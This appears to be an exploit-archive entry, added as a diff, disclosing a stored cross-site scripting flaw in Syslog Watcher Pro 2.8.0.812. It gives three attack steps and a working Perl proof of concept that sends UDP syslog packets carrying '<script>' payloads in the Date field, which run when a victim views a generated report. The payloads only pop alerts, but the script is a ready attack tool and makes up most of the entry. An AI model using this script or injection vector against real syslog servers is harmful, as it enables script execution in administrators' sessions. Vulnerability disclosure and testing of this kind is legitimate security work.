@@ -1,0 +1,55 @@
+id: 20719
+date: 05/01/2013
+title: Syslog Watcher Pro 2.8.0.812 - (Date Parameter) - CSS Vulnerability
+author: demonalex
+cves: 
+
+How to Attack :
+STEP 1: Send a syslog packet which contained XSS code into 'Date' Parameter to Syslog Watcher Pro.
+STEP 2: Syslog Watcher Pro put XSS code into database.
+STEP 3: XSS code will be executed after victim generate and view report by Syslog Watcher Pro.
+ 
+Proof Of Concept :
+-----------------------------------------------------------
+#!/usr/bin/perl
+use IO::Socket::INET;
+$|=1;
+ 
+$host=shift;
+$port=shift;
+ 
+if(defined($host) && defined($port)){
+  ;
+}else{
+  die "usage: $0 host port\n";
+}
+ 
+$con=new IO::Socket::INET->new(PeerPort=>$port,
+        Proto=>'udp',
+        PeerAddr=>$host);
+ 
+$npriority = '<0>';
+$nhostname = "10.0.0.2";
+$npid = 'test[10]';
+$nmsg = "testing by demonalex";
+ 
+$testcase1="<script>alert(\"XSS1\")</script>";
+$testcase2="<script>alert(/XSS2/)</script>";
+ 
+#testcase1
+$header = $testcase1.' '.$nhostname.' '.$npid;
+$packet = $npriority.$header.': '.$nmsg;
+$con->send($packet);
+ 
+#testcase2
+$header = $testcase2.' '.$nhostname.' '.$npid;
+$packet = $npriority.$header.': '.$nmsg;
+$con->send($packet);
+ 
+$con->close;
+ 
+print "Over!\n";
+ 
+exit(1);
+
+#  0day.today [2023-03-23]  #
